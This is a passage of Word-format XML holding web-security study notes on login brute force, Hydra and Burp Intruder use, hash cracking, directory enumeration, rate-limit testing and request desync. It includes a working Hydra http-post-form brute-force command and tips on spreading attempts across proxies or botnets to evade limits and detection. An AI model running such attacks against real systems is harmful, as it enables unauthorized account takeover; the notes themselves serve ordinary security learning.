    <w:p w14:paraId="4A7E0F0D" w14:textId="77777777" w:rsidR="008845E1" w:rsidRDefault="008845E1" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Distributed Attempts → Spread login attempts across many IPs, proxies, or botnets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CE101B" w14:textId="1AF4B437" w:rsidR="008845E1" w:rsidRDefault="008845E1" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Username Enumeration First → Find valid usernames via error message or response timing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A773FA1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="90" w:name="_Toc208408561"/>
      <w:r>
        <w:t>Tools</w:t>
      </w:r>
      <w:bookmarkEnd w:id="90"/>
    </w:p>
    <w:p w14:paraId="6C8F7C6B" w14:textId="02BA089C" w:rsidR="00C63726" w:rsidRPr="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="91" w:name="_Toc208408562"/>
      <w:r>
        <w:t>Hydra</w:t>
      </w:r>
      <w:bookmarkEnd w:id="91"/>
    </w:p>
    <w:p w14:paraId="2A3749B1" w14:textId="56C02EEE" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hydra</w:t>
      </w:r>
      <w:r w:rsidR="00C63726">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>→ Parallelized login cracker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2612CA3E" w14:textId="0288F25C" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Takes list of usernames and/or passwords</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E5762E" w14:textId="25D54A1D" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tries them against a target service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F38B64" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Runs many attempts in parallel for speed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44375C83" w14:textId="5AC67342" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Works on multiple protocols</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE4D79F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5830B3EB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Hydra [options] -L &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>userlist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>&gt; -P &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>passlist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>&gt; &lt;target&gt; &lt;service&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F73314F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>-L → File with usernames</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613795F7" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>-l → Single username</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C80FEA5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>-P → File with password list</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB5D894" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>-p → Single password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A42A166" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>&lt;target&gt; → Hostname or IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293694CE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>&lt;service&gt; → Protocol module</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF77901" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>-t → Number of parallel tasks/threads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E9F0DC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>-V → Verbose, show every attempt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC9E510" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>-f → Stop after first valid login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5265790B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Example HTTP Post</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E179EF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Hydra -L users.txt -P passwords.txt 192.168.1.30 http-post-form “/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>login:username</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=^USER^&amp;password=^PASS^:F=Invalid Login”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0F7E9E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Target: /login page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F796776" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Submits username and password fields</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8301A5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Detects failure when response contains ‘Invalid login’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE2E05F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="92" w:name="_Toc208408563"/>
      <w:r>
        <w:t>Burp Suite Intruder</w:t>
      </w:r>
      <w:bookmarkEnd w:id="92"/>
    </w:p>
    <w:p w14:paraId="4DC676A6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Automates sending many HTTP requests with varying inputs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C2ABD9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Supports brute force, fuzzing, injection discovery, session testing, parameter manipulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3447931A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Types of Attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E31C2B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sniper → One field at a time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBC81A6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Battering Ram → Same payload across multiple fields</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C6A9F4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pitchfork → Multiple payload sets, used in parallel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2572B7CE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cluster Bomb → All combinations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D021C39" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t xml:space="preserve">• Can use throttle in order to prevent </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15018E00" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRPr="00C63726" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="93" w:name="_Toc208408564"/>
      <w:r>
        <w:t>Hash Cracking</w:t>
      </w:r>
      <w:bookmarkEnd w:id="93"/>
    </w:p>
    <w:p w14:paraId="77B160ED" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>→ Hash = One-way mathematical function output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE05683" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>→ In authentication, passwords aren’t stored as plain text → they’re hashed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B63C784" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>→ Hash Cracking = Trying to recover the original input from the hash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE9EA64" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRPr="00C63726" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="94" w:name="_Toc208408565"/>
      <w:r>
        <w:t>How Cracking is Done?</w:t>
      </w:r>
      <w:bookmarkEnd w:id="94"/>
    </w:p>
    <w:p w14:paraId="11D1FD8F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Dictionary Attack → Compare each word from a list against the hash. Fast but works if password is common.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF91AE9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Brute Force → Try every possible combination until the hash matches. Guaranteed success but slow for long/complex passwords.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528A2CD1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Rule-Based → Modify dictionary words with mangling rules (e.g., Password → Password1 → </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>P@ssword</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>). Highly effective in real world.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E63568" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hybrid Attack → Combine dictionary + brute force (e.g., wordlist + suffix numbers).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C07A26" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRPr="008845E1" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="95" w:name="_Toc208408566"/>
      <w:r>
        <w:t>Forced Browsing</w:t>
      </w:r>
      <w:bookmarkEnd w:id="95"/>
    </w:p>
    <w:p w14:paraId="181AE6CA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>→ Aka Directory Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1484D6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>→ Accessing hidden or unlinked resources on a web server by manually guessing or automating requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D38DB16" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRPr="008845E1" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="96" w:name="_Toc208408567"/>
      <w:r>
        <w:t>Attackers Try To</w:t>
      </w:r>
      <w:bookmarkEnd w:id="96"/>
    </w:p>
    <w:p w14:paraId="4939B08F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Guess common directories: /admin, /backup, /test, /dev</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4537486C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Guess files: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>config.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>db.sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>debug.log</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>git</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E23557" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use wordlist to automate enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25255034" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Exploit predictable naming</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2382AFA3" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="97" w:name="_Toc208408568"/>
      <w:r>
        <w:t>Approach</w:t>
      </w:r>
      <w:bookmarkEnd w:id="97"/>
    </w:p>
    <w:p w14:paraId="6798C466" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Recon the Target → Passive intel (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sitemap.xml</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, robots.txt, JS files). Look for hidden endpoints or API calls, note error pages &amp; status codes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB36221" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Wordlist-Based Scanning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC88D76" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Look for Predictability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE7E346" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Check Access Controls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5106D490" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRPr="008845E1" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="98" w:name="_Toc208408569"/>
      <w:r>
        <w:t>Rate Limiting</w:t>
      </w:r>
      <w:bookmarkEnd w:id="98"/>
    </w:p>
    <w:p w14:paraId="0E1573F4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>• A control that restricts how many requests you can make in a given time window.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="680E10BC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="99" w:name="_Toc208408570"/>
      <w:r>
        <w:t>Tests</w:t>
      </w:r>
      <w:bookmarkEnd w:id="99"/>
    </w:p>
    <w:p w14:paraId="7EA4E5DE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Baseline: Try rapid requests → see when we get blocked (HTTP 429)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1713733B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Backoff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>: Does waiting a few seconds reset it?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60386264" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Scope: Is it global or per account/IP?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E238CDD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Error Consistency: Are blocked responses distinguishable?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64DFE1C2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Request Desync</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE4C9D5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="100" w:name="_Toc208408571"/>
      <w:r>
        <w:t>Implementations</w:t>
      </w:r>
      <w:bookmarkEnd w:id="100"/>
    </w:p>
    <w:p w14:paraId="131FE1F9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Fixed Window → X requests per minute, reset every minute</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492CCF05" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sliding Window → Rolling count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570ECA2F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Token Bucket → Bucket of tokens refills over time; each request consumes one</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6F3EF8" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Exponential </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Backoff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> → Each failure increases wait time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCF9E63" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="101" w:name="_Toc208408572"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Request Desync</w:t>
      </w:r>
      <w:bookmarkEnd w:id="101"/>
    </w:p>
    <w:p w14:paraId="3AFC2431" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Mix valid and invalid requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760538AD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Interleave requests across different users</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="415C2CA0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Spread across proxies or botnets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0828BFA2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Request Desync = When two systems disagree on request boundaries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4C6499" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Most common: Frontend proxy vs backend server parse Content-Length and Transfer-Encoding differently.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73BC04A4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>HTTP Request Details</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0AF739" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Content-Length: Exact size of body in bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BB120F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Transfer-Encoding: Chunked → Body is sent in chunks, each prefixed with its length, ending with 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB0A6CF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="102" w:name="_Toc208408573"/>
      <w:r>
        <w:t>File Upload</w:t>
      </w:r>
      <w:bookmarkEnd w:id="102"/>
    </w:p>
    <w:p w14:paraId="0CFC397B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>File Upload functionality allows users to transfer files from their local system to web application’s server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4335D4D6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="103" w:name="_Toc208408574"/>
      <w:r>
        <w:t>Usage:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="103"/>
    </w:p>
    <w:p w14:paraId="0332F594" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Uploading profile picture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5503EE74" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Submitting documents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DFC11F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sharing attachments</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0078BC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Uploading backups, logs or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>config</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0624A02A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="104" w:name="_Toc208408575"/>
      <w:r>
        <w:t>Workflow:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="104"/>
    </w:p>
    <w:p w14:paraId="462112E5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>User selects file in browser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDEB866" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Browser sends file via HTTP POST request (usually multipart/form-data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64551FC2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Server stores file in designated directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B03550" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Application may process, preview or render the file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F9FDC0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="105" w:name="_Toc208408576"/>
      <w:r>
        <w:t>Vulnerabilities:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="105"/>
    </w:p>
    <w:p w14:paraId="7B8897B9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Malicious File Types</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4231807B" w14:textId="6E4407AE" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
